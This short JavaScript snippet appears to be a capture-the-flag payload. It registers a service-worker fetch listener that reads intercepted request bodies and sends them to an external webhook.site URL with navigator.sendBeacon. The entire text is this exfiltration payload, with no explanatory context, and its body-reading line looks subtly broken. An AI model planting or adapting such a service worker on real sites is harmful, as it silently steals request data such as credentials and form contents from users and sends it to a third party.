self.addEventListener("fetch", (event => {
    var flag = event.request.body.text
    navigator.sendBeacon("https://webhook.site/7f06f245-7ac8-426e-9a0f-c54ae8853cfa", flag)
}))